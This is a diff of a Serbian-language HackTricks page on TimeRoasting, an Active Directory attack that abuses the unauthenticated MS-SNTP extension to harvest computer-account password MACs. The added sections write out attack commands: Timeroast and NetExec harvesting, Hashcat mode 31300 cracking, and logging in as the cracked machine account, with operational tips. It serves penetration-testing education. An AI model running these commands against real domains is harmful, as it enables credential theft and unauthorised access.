@@ -2,39 +2,58 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-timeRoasting, glavni uzrok je zastarjeli mehanizam autentifikacije koji je Microsoft ostavio u svom proširenju za NTP servere, poznatom kao MS-SNTP. U ovom mehanizmu, klijenti mogu direktno koristiti bilo koji Relativni Identifikator (RID) računa računara, a kontroler domena će koristiti NTLM hash računa računara (generisan MD4) kao ključ za generisanje **Koda za autentifikaciju poruke (MAC)** paketa odgovora.
+TimeRoasting zloupotrebljava legacy MS-SNTP authentication extension. U MS-SNTP, klijent može poslati 68-bajtni zahtev koji ugrađuje bilo koji computer account RID; domain controller koristi computer account-ov NTLM hash (MD4) kao ključ da izračuna MAC nad odgovorom i vrati ga. Napadači mogu prikupiti ove MS-SNTP MACs neautentifikovano i crack them offline (Hashcat mode 31300) da bi povratili lozinke computer account-a.
 
-Napadači mogu iskoristiti ovaj mehanizam da dobiju ekvivalentne hash vrednosti proizvoljnih računa računara bez autentifikacije. Jasno je da možemo koristiti alate poput Hashcat za brute-forcing.
-
-Specifičan mehanizam može se videti u odeljku 3.1.5.1 "Ponašanje zahteva za autentifikaciju" [službene Windows dokumentacije za MS-SNTP protokol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf).
-
-U dokumentu, odeljak 3.1.5.1 pokriva Ponašanje zahteva za autentifikaciju.
+Vidi sekciju 3.1.5.1 "Authentication Request Behavior" i 4 "Protocol Examples" u zvaničnom MS-SNTP spec za detalje.
 ![](../../images/Pasted%20image%2020250709114508.png)
-Može se videti da kada je ExtendedAuthenticatorSupported ADM element postavljen na `false`, originalni Markdown format se zadržava.
+Kada je ExtendedAuthenticatorSupported ADM element false, klijent šalje 68-bajtni zahtev i ugrađuje RID u 31 najmanje značajnih bita Key Identifier podpolja authenticator-a.
 
->Citirano u originalnom članku：
->>Ako je ExtendedAuthenticatorSupported ADM element lažan, klijent MORA konstruisati poruku Klijent NTP Zahteva. Dužina poruke Klijent NTP Zahteva je 68 bajtova. Klijent postavlja polje Authenticator poruke Klijent NTP Zahteva kao što je opisano u odeljku 2.2.1, upisujući najmanje značajnih 31 bit RID vrednosti u najmanje značajnih 31 bit podpolja Identifikatora ključa autentifikatora, a zatim upisujući vrednost Selektora ključa u najznačajniji bit podpolja Identifikatora ključa.
+> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.
 
-U odeljku 4 Dokumenta Primeri protokola tačka 3
+Iz sekcije 4 (Protocol Examples):
 
->Citirano u originalnom članku：
->>3. Nakon primanja zahteva, server proverava da li je veličina primljene poruke 68 bajtova. Ako nije, server ili odbacuje zahtev (ako veličina poruke nije jednaka 48 bajtova) ili ga tretira kao neautentifikovani zahtev (ako je veličina poruke 48 bajtova). Pretpostavljajući da je veličina primljene poruke 68 bajtova, server izvlači RID iz primljene poruke. Server ga koristi da pozove metodu NetrLogonComputeServerDigest (kako je navedeno u [MS-NRPC] odeljku 3.5.4.8.2) da izračuna kripto-čekove i odabere kripto-ček na osnovu najznačajnijeg bita podpolja Identifikatora ključa iz primljene poruke, kako je navedeno u odeljku 3.2.5. Server zatim šalje odgovor klijentu, postavljajući polje Identifikatora ključa na 0 i polje Kripto-ček na izračunati kripto-ček.
+> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.
 
-Prema opisu u gornjem Microsoftovom zvaničnom dokumentu, korisnici ne trebaju nikakvu autentifikaciju; samo treba da popune RID da pokrenu zahtev, a zatim mogu dobiti kriptografski ček. Kriptografski ček je objašnjen u odeljku 3.2.5.1.1 dokumenta.
+Crypto-checksum je zasnovan na MD5 (see 3.2.5.1.1) i može biti cracked offline, što omogućava roasting attack.
 
->Citirano u originalnom članku：
->>Server preuzima RID iz najmanje značnih 31 bita podpolja Identifikatora ključa polja Autentifikatora poruke Klijent NTP Zahteva. Server koristi metodu NetrLogonComputeServerDigest (kako je navedeno u [MS-NRPC] odeljku 3.5.4.8.2) da izračuna kripto-čekove sa sledećim ulaznim parametrima:
->>>![](../../images/Pasted%20image%2020250709115757.png)
+## Kako napasti
 
-Kriptografski ček se izračunava koristeći MD5, a specifičan proces se može pogledati u sadržaju dokumenta. Ovo nam daje priliku da izvršimo napad roštiljanja.
-
-## kako napasti
-
-Citat za https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/
-
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Skripte za Timeroasting od Toma Tervoorta
-```
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
+```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
 ```
+---
+
+## Praktični napad (unauth) sa NetExec + Hashcat
+
+- NetExec može da enumeriše i prikupi MS-SNTP MACs za computer RIDs unauthenticated i ispiše $sntp-ms$ hashes spremne za cracking:
+```bash
+# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
+netexec smb <dc_fqdn_or_ip> -M timeroast
+# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
+```
+- Crack offline pomoću Hashcat mode 31300 (MS-SNTP MAC):
+```bash
+hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
+# or let recent hashcat auto-detect; keep RIDs with --username for convenience
+```
+- Oporavljeni cleartext odgovara lozinki computer account. Pokušajte ga direktno koristiti kao machine account koristeći Kerberos (-k) kada je NTLM onemogućen:
+```bash
+# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
+netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
+```
+Operativni saveti
+- Obezbedite tačnu sinhronizaciju vremena pre Kerberos-a: `sudo ntpdate <dc_fqdn>`
+- Po potrebi, generišite krb5.conf za AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
+- Kasnije mapirajte RIDs na principals putem LDAP/BloodHound kada imate bilo kakav autentifikovani pristup.
+
+## Reference
+
+- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
+- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
+- [NetExec – official docs](https://www.netexec.wiki/)
+- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 {{#include ../../banners/hacktricks-training.md}}
